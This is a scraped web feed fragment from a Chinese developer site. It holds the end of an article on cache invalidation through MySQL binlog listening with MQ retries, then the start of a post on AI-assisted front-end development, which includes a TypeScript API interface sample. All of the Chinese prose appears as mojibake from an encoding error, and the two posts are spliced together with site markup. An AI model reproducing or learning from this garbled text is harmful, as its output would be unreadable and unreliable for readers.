<p>å…¶å®ï¼Œè¿˜æœ‰ä¸€ç§æ›´ä¼˜é›…çš„å®ç°ï¼Œå³<code>ç›‘å¬binlog</code>ï¼Œæ¯”å¦‚ä½¿ç”¨ï¼š<code>canal</code>ç­‰ä¸­é—´ä»¶ã€‚</p>
<p>å…·ä½“æ–¹æ¡ˆå¦‚ä¸‹ï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9430430455cb4e91a0291fc3d89eea25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=z1U%2BxZNcznP5kJq3ToyKo%2Bncz3U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>åœ¨ä¸šåŠ¡æ¥å£ä¸­å†™æ•°æ®åº“ä¹‹åï¼Œå°±ä¸ç®¡äº†ï¼Œç›´æ¥è¿”å›æˆåŠŸã€‚</li>
<li>mysqlæœåŠ¡å™¨ä¼šè‡ªåŠ¨æŠŠå˜æ›´çš„æ•°æ®å†™å…¥binlogä¸­ã€‚</li>
<li>binlogè®¢é˜…è€…è·å–å˜æ›´çš„æ•°æ®ï¼Œç„¶ååˆ é™¤ç¼“å­˜ã€‚</li>
</ol>
<p>è¿™å¥—æ–¹æ¡ˆä¸­ä¸šåŠ¡æ¥å£ç¡®å®ç®€åŒ–äº†ä¸€äº›æµç¨‹ï¼Œåªç”¨å…³å¿ƒæ•°æ®åº“æ“ä½œå³å¯ï¼Œè€Œåœ¨binlogè®¢é˜…è€…ä¸­åšç¼“å­˜åˆ é™¤å·¥ä½œã€‚</p>
<p>ä½†å¦‚æœåªæ˜¯æŒ‰ç…§å›¾ä¸­çš„æ–¹æ¡ˆè¿›è¡Œåˆ é™¤ç¼“å­˜ï¼Œåªåˆ é™¤äº†ä¸€æ¬¡ï¼Œä¹Ÿå¯èƒ½ä¼šå¤±è´¥ã€‚</p>
<p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</p>
<p>ç­”ï¼šè¿™å°±éœ€è¦åŠ ä¸Šå‰é¢èŠè¿‡çš„<code>é‡è¯•æœºåˆ¶</code>äº†ã€‚å¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥ï¼Œå†™å…¥é‡è¯•è¡¨ï¼Œä½¿ç”¨å®šæ—¶ä»»åŠ¡é‡è¯•ã€‚æˆ–è€…å†™å…¥mqï¼Œè®©mqè‡ªåŠ¨é‡è¯•ã€‚</p>
<p>åœ¨è¿™é‡Œæ¨èä½¿ç”¨<code>mqè‡ªåŠ¨é‡è¯•æœºåˆ¶</code>ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6cb348461b341228da1a0998b4f3766~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=T8Hq%2Fs%2BdTKMkMkuSPLhtSDSHp98%3D" alt="å›¾ç‰‡" loading="lazy"/>åœ¨binlogè®¢é˜…è€…ä¸­å¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥ï¼Œåˆ™å‘é€ä¸€æ¡mqæ¶ˆæ¯åˆ°mqæœåŠ¡å™¨ï¼Œåœ¨mqæ¶ˆè´¹è€…ä¸­è‡ªåŠ¨é‡è¯•5æ¬¡ã€‚å¦‚æœæœ‰ä»»æ„ä¸€æ¬¡æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›æˆåŠŸã€‚å¦‚æœé‡è¯•5æ¬¡åè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™è¯¥æ¶ˆæ¯è‡ªåŠ¨è¢«æ”¾å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼Œåé¢å¯èƒ½éœ€è¦äººå·¥ä»‹å…¥ã€‚</p>
<h2 data-id="heading-15">æœ€åè¯´ä¸€å¥(æ±‚å…³æ³¨ï¼Œåˆ«ç™½å«–æˆ‘)</h2>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæˆ–è€…æœ‰æ‰€å¯å‘çš„è¯ï¼Œå¸®å¿™å…³æ³¨ä¸€ä¸‹æˆ‘çš„åŒåå…¬ä¼—å·ï¼šè‹ä¸‰è¯´æŠ€æœ¯ï¼Œæ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œæœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>æ±‚ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€è½¬å‘ã€åœ¨çœ‹ã€‚</p>
<p>å…³æ³¨å…¬ä¼—å·ï¼šã€è‹ä¸‰è¯´æŠ€æœ¯ã€‘ï¼Œåœ¨å…¬ä¼—å·ä¸­å›å¤ï¼šè¿›å¤§å‚ï¼Œå¯ä»¥å…è´¹è·å–æˆ‘æœ€è¿‘æ•´ç†çš„10ä¸‡å­—çš„é¢è¯•å®å…¸ï¼Œå¥½å¤šå°ä¼™ä¼´é è¿™ä¸ªå®å…¸æ‹¿åˆ°äº†å¤šå®¶å¤§å‚çš„offerã€‚</p>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜ï¼šsusan.net.cn/project</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿]]></title>    <link>https://juejin.cn/post/7596932640727056419</link>    <guid>https://juejin.cn/post/7596932640727056419</guid>    <pubDate>2026-01-20T01:54:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596932640727056419" data-draft-id="7594655863547527220" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-20T01:54:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ”¿é‡‡äº‘æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/3456520257288974"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3456520257288974/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ”¿é‡‡äº‘æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:54:33.000Z" title="Tue Jan 20 2026 01:54:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»35åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b637793da67b4e068460a99d94b333ed~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=4722&amp;h=696&amp;s=276733&amp;e=png&amp;b=fafcff" alt="æ–‡ç« é¡¶éƒ¨.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75673793cb9e4e8e961d830824affd4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=bi8BWlMHR8C%2Fp0vZ0RE8aMixmDg%3D" alt="ä½œè€…å¡ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-0">AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿</h2>
<h3 data-id="heading-1">å¼•è¨€ï¼šAIè¾…åŠ©ç ”å‘çš„æ„ä¹‰</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ad08daf14d74f249070642fcf1b51cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=otT8BqvW8KEDN5gJtCiDSMPXXs0%3D" alt="image.png" loading="lazy"/></p>
<p>ç°å¦‚ä»Šï¼Œéšç€ä¼ä¸šå†…éƒ¨ç³»ç»Ÿä¸æ–­æ¼”è¿›ã€ä¸šåŠ¡å¤æ‚åº¦çš„æŒç»­æ”€å‡ï¼Œç ”å‘å›¢é˜Ÿæ‰€é¢ä¸´çš„æŒ‘æˆ˜å·²è¿œè¶…ä»¥å¾€ï¼šéœ€æ±‚å˜åŒ–æ›´å¿«ã€åä½œé“¾è·¯æ›´é•¿ã€äº§å“äº¤ä»˜èŠ‚å¥æ›´ç´§å‡‘ã€‚åœ¨è¿™æ ·çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¹Ÿåœ¨æ—¥å¸¸å·¥ä½œå®è·µä¸­ä¸æ–­é‡åˆ°å¤§é‡å¯è‡ªåŠ¨åŒ–ã€å¯ææ•ˆçš„ç¯èŠ‚ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>é‡å¤æ€§çš„ä»£ç ç¼–å†™</li>
<li>ä»£ç è§„èŒƒæ£€æŸ¥</li>
<li>æ–‡æ¡£çŸ¥è¯†çš„æ£€ç´¢</li>
<li>å„ç±»å·¥å…·çš„æ„å»º</li>
<li>......</li>
</ul>
<p>è¿™äº›å·¥ä½œå†…å®¹éšç€é¡¹ç›®æ¨è¿›ä¸æ–­ç´¯ç§¯ï¼Œé€æ¸æˆä¸ºå½±å“æ•´ä½“äº¤ä»˜è´¨é‡çš„éšå½¢æˆæœ¬ã€‚</p>
<p>ä¼ ç»Ÿçš„ç ”å‘ä¸»è¦ä¾é ç»éªŒå’ŒäººåŠ›è¿›è¡Œæ¨è¿›ï¼Œè€ŒÂ AIÂ çš„åŠ å…¥ï¼Œä»¿ä½›ä¸ºæ¯ä½å·¥ç¨‹å¸ˆé…å¤‡äº†ä¸€ä½â€œæŠ€æœ¯åˆä¼™äººâ€â€”å®ƒèƒ½åœ¨æ¶æ„ã€è®¾è®¡ã€æ–‡æ¡£ã€ç¼–ç ã€è°ƒè¯•ç­‰å¤šä¸ªç¯èŠ‚ç»™æˆ‘ä»¬åé¦ˆï¼Œå‡å°‘æˆ‘ä»¬çš„å·¥ä½œé‡ï¼Œå°†æ›´å¤šç²¾åŠ›æŠ•å…¥åˆ°æ›´å…·åˆ›é€ æ€§çš„å·¥ä½œä¸­ã€‚(ç®€å•æ¥è¯´ï¼Œè„æ´»ç´¯æ´»äº¤ç»™Â AIï¼Œæˆ‘ä»¬è´Ÿè´£æŠŠæ§å¤§æ–¹å‘)</p>
<p>AIÂ è¾…åŠ©ç ”å‘çš„æ„ä¹‰ï¼Œä¸ä»…åœ¨äºæå‡æ•ˆç‡ï¼Œæ›´åœ¨äºè®©æŠ€æœ¯å›¢é˜Ÿåœ¨å¤æ‚åº¦ä¸æ–­æå‡çš„æ—¶ä»£ä»èƒ½ä¿æŒé«˜å“è´¨ä¸æŒç»­æ¼”è¿›çš„èƒ½åŠ›ã€‚å®è·µä¸­ä¹Ÿä¸æ–­è¯æ˜ï¼Œå–„ç”¨Â AIÂ çš„ç ”å‘æ–¹å¼ï¼Œèƒ½å¤Ÿæ˜¾è‘—é™ä½å¼€å‘æˆæœ¬ã€ç¼©çŸ­äº¤ä»˜å‘¨æœŸï¼Œå¹¶æå‡æ•´ä½“äº§èƒ½ã€‚</p>
<blockquote>
<p>å¯¹äºç»å¤§å¤šæ•°å¼€å‘è€…æ¥è¯´ï¼Œæ“…é•¿ä½¿ç”¨AIèƒ½èŠ‚çœæœ€å°‘50%çš„å¼€å‘æˆæœ¬ã€‚</p>
</blockquote>
<p>æ¥ä¸‹æ¥ï¼Œæœ¬æ–‡å°†ä»â€œå·¥å…·å®è·µâ€ä¸â€œä¸ªäººæˆé•¿â€ä¸¤ä¸ªç»´åº¦ï¼Œåˆ†äº«æˆ‘åœ¨Â AIÂ è¾…åŠ©ç ”å‘æ–¹é¢çš„è½åœ°ç»éªŒä¸æ€è€ƒï¼Œå¸Œæœ›èƒ½ä¸ºå¤§å®¶å¸¦æ¥ä¸€äº›å‚è€ƒä¸å¯å‘ã€‚</p>
<blockquote>
<p>ğŸ’¡æç¤ºï¼šæœ¬æ–‡å°†ä¸æ¶‰åŠä»»ä½•å…·ä½“çš„ä»£ç å®ç°æˆ–æŠ€æœ¯ç»†èŠ‚ï¼Œè¿™äº›å†…å®¹ä¹Ÿä¸åœ¨æœ¬æ–‡çš„è®¨è®ºèŒƒå›´ä¹‹å†…ã€‚æœ¬æ–‡å°†ä»…ä»å¼€å‘è€…è§†è§’å‡ºå‘ï¼Œåˆ†äº«åœ¨å®é™…ç ”å‘è¿‡ç¨‹ä¸­ï¼Œå¦‚ä½•å€ŸåŠ©Â AIÂ è¾…åŠ©å®Œæˆéœ€æ±‚åˆ†æã€èƒ½åŠ›è§„åˆ’ä¸æ–¹æ¡ˆæ¢³ç†ç­‰å·¥ä½œæ–¹æ³•ã€‚</p>
</blockquote>
<h3 data-id="heading-2">ä¸€ã€ä¼ä¸šçº§ <code>VSCode</code> æ’ä»¶å¼€å‘å®è·µ</h3>
<h4 data-id="heading-3">1.1ã€èƒŒæ™¯ä¸ç—›ç‚¹</h4>
<p>åœ¨å‰ç«¯å¼€å‘ä½“ç³»ä¸æ–­æ¼”è¿›çš„ä»Šå¤©ï¼Œ<code>API</code>Â å·²ç»æˆä¸ºè´¯ç©¿ä¸šåŠ¡ã€é¡µé¢ä¸æœåŠ¡ä¹‹é—´çš„å…³é”®çº½å¸¦ã€‚ä½†æˆ‘ä»¬åœ¨å®é™…çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œåœ¨æ¥å£ç®¡ç†ä¸Šä»é¢ä¸´è¯¸å¤šç—›ç‚¹ï¼Œè¿™é‡Œä»¥æˆ‘å¹³æ—¶å¼€å‘çš„å¼€å‘ç»å†ä¸ºä¾‹ï¼š</p>
<ul>
<li><strong>æ¥å£æ¥æºåˆ†æ•£</strong>ï¼šé¡¹ç›®ä¾èµ–çš„æ¥å£å¾€å¾€å­˜æ”¾åœ¨Â <code>YAPI</code>Â æˆ–ç¬¬ä¸‰æ–¹æ–‡æ¡£å¹³å°ä¸­ï¼ŒæŸ¥æ‰¾ä¸æ ¸å¯¹æˆæœ¬é«˜ã€‚</li>
<li><strong>ç±»å‹ç»´æŠ¤æˆæœ¬é«˜</strong>ï¼š<code>TypeScript</code>Â è™½ç„¶æå‡äº†ç±»å‹å®‰å…¨ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€æ¯æ¬¡æ¥å…¥æ–°æ¥å£ã€è°ƒæ•´å­—æ®µç»“æ„æ—¶ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æ‰‹åŠ¨è¡¥å……/ä¿®æ”¹å¯¹åº”çš„è¯·æ±‚ä¸å“åº”ç±»å‹ã€‚</li>
<li><strong>é‡å¤æ€§åŠ³åŠ¨é¢‘ç¹</strong>ï¼šæ¥å£ç»“æ„å˜æ›´åï¼Œå¼€å‘è€…ä¸å¾—ä¸åå¤åŒæ­¥æ–‡æ¡£ã€æ›´æ–°ç±»å‹æ–‡ä»¶ã€è°ƒæ•´è°ƒç”¨æ–¹å¼ï¼Œè¿™ç±»æœºæ¢°æ“ä½œæ—¢è€—æ—¶ä¹Ÿå®¹æ˜“é—æ¼ã€‚</li>
<li><strong>ç»„ä»¶åº“ä½¿ç”¨ç¼ºä¹â€œæ‰€è§å³æ‰€å¾—â€çš„æç¤ºä½“éªŒ</strong>ï¼šåœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼ŒæŸ¥ç»„ä»¶å±æ€§ã€æŸ¥ç”¨æ³•ã€æŸ¥æ–‡æ¡£ä¹Ÿæ˜¯é«˜é¢‘åŠ¨ä½œï¼Œä½†åœ¨ç¼–è¾‘å™¨ä¸­å¹¶æ²¡æœ‰ç»Ÿä¸€çš„è¡¥å…¨ã€æç¤ºä¸è·³è½¬èƒ½åŠ›ã€‚</li>
</ul>
<p><strong>ç¹ççš„æ¥å£å®šä¹‰</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> æ˜¯å¦å¼€å¯æ™ºèƒ½ä½“-queryè¯·æ±‚å‚æ•°
 * <span class="hljs-doctag">@url</span> https://yapi.xxx.com/project/0000/interface/api/817314
 * <span class="hljs-doctag">@updateDate</span> 2025-08-21 15:23:33
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IApiProjectJudgementAiAgentIsOpenGetReqQuery</span> {
  id?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> æ˜¯å¦å¼€å¯æ™ºèƒ½ä½“-å“åº”ä½“
 * <span class="hljs-doctag">@url</span> https://yapi.xxx.com/project/0000/interface/api/817314
 * <span class="hljs-doctag">@updateDate</span> 2025-08-21 15:23:33
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IApiProjectJudgementAiAgentIsOpenGetResBody</span> {
  success?: <span class="hljs-built_in">boolean</span>;
  result?: <span class="hljs-built_in">boolean</span>;
  code?: <span class="hljs-built_in">string</span>;
  message?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> æ˜¯å¦å¼€å¯æ™ºèƒ½ä½“
 * <span class="hljs-doctag">@url</span> https://yapi.xxx.com/project/0000/interface/api/817314
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">apiProjectJudgementAiAgentIsOpenGet</span>(<span class="hljs-params">
  params: IApiProjectJudgementAiAgentIsOpenGetReqQuery,
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">IApiProjectJudgementAiAgentIsOpenGetResBody</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(<span class="hljs-string">'/api/project/judgement/ai/agent/isopen'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
    params,
  });
}
</code></pre>
<p><strong>ç»„ä»¶å±æ€§æŸ¥çœ‹</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/201119c2de454575b1938553b95007f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=i36t3TiFG%2F3IoYP%2F%2BJsgR4GpmWY%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™äº›é—®é¢˜å åŠ åœ¨ä¸€èµ·ï¼Œè®©æœ¬è¯¥â€œè§„èŒƒé«˜æ•ˆâ€çš„Â <code>API</code>Â ç®¡ç†æµç¨‹å˜å¾—çç¢ä½æ•ˆï¼Œç”šè‡³å½±å“å›¢é˜Ÿæ•´ä½“çš„å¼€å‘ä½“éªŒä¸äº¤ä»˜è´¨é‡ã€‚</p>
<p>åŸºäºè¿™æ ·çœŸå®ä¸”åå¤å‡ºç°çš„å¼€å‘ç—›ç‚¹ï¼Œæˆ‘ä»¬å†³å®šå¼€å‘ä¸€æ¬¾Â <code>VSCode</code>Â æ’ä»¶ï¼Œé€šè¿‡å·¥å…·åŒ–çš„æ–¹å¼è§£å†³è¿™äº›å·¥ç¨‹ä¸­çš„â€œéšæ€§æˆæœ¬â€ï¼Œç»Ÿä¸€æ¥å£æ¥æºã€å‡å°‘é‡å¤åŠ³åŠ¨ï¼Œå¹¶è¡¥é½ç¼–è¾‘å™¨å†…çš„æç¤ºèƒ½åŠ›ï¼Œä»è€Œæå‡æ•´ä¸ªå›¢é˜Ÿçš„ç ”å‘æ•ˆç‡ã€‚</p>
<blockquote>
<p>åŒæ—¶ï¼Œéšç€Â AIÂ æŠ€æœ¯çš„å¿«é€Ÿå‘å±•ï¼Œå¼€å‘äººå‘˜åœ¨æ—¥å¸¸å·¥ä½œä¸­å·²æŒç»­ã€é«˜é¢‘åœ°æ¥è§¦å¹¶æ·±å…¥ä½¿ç”¨å„ç±»Â AIÂ å·¥å…·ã€‚åŸºäºè¿™ä¸€é•¿æœŸå®è·µä¸åé¦ˆæ²‰æ·€ï¼Œæˆ‘ä»¬é€æ­¥æ€»ç»“å¹¶å½¢æˆäº†ä¸€å¥—é€‚ç”¨äºå½“å‰é˜¶æ®µçš„ç ”å‘åä½œæµç¨‹ï¼Œç”¨ä»¥åœ¨ä¿éšœå·¥ç¨‹è´¨é‡ä¸å¯æ§æ€§çš„å‰æä¸‹ï¼Œå……åˆ†å‘æŒ¥Â AIÂ çš„è¾…åŠ©ä»·å€¼ã€‚</p>
</blockquote>
<h4 data-id="heading-4">1.2ã€è¾…åŠ©ç ”å‘æµç¨‹</h4>
<p>ä¸‹å›¾ä¸ºç®€æ˜“æµç¨‹å±•ç¤ºï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a503041784374e81be627b3e72c7e594~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=TC79H5%2BG5WWJ2rim%2BCxpD%2BUTkR0%3D" alt="image" loading="lazy"/></p>
<h5 data-id="heading-5">1.2.1ã€é˜¶æ®µä¸€ï¼šAIÂ ä¸»å¯¼ã€äººå·¥è¾…åŠ©ï¼ˆæ–¹æ¡ˆç”Ÿæˆé˜¶æ®µï¼‰</h5>
<p>æœ¬é˜¶æ®µçš„æ ¸å¿ƒç›®æ ‡æ˜¯<strong>å¿«é€Ÿå½¢æˆç»“æ„åŒ–ã€å¯è¯„å®¡çš„æ•´ä½“æ–¹æ¡ˆ</strong>ï¼Œé€šè¿‡Â AIÂ çš„å½’çº³ä¸å‘æ•£èƒ½åŠ›é™ä½å‰æœŸè®¾è®¡æˆæœ¬ï¼Œç”±äººå·¥å¯¹å…³é”®å†³ç­–è¿›è¡ŒæŠŠæ§ä¸ä¿®æ­£ã€‚</p>
<ol>
<li><strong>éœ€æ±‚åˆ†æ</strong>ï¼šæ˜ç¡®ç”¨æˆ·ç—›ç‚¹ã€ç›®æ ‡ç”¨æˆ·ã€æ ¸å¿ƒåŠŸèƒ½å’Œç•Œé¢è®¾è®¡ã€‚</li>
<li><strong>æŠ€æœ¯æ–¹æ¡ˆ/è§„åˆ’</strong>ï¼šåˆ©ç”¨Â AIÂ å½’çº³æ•´ç†æ¶æ„ã€æ¨¡å—åˆ’åˆ†ã€æŠ€æœ¯é€‰å‹ï¼Œç”Ÿæˆæ–¹æ¡ˆæ–‡æ¡£ã€‚</li>
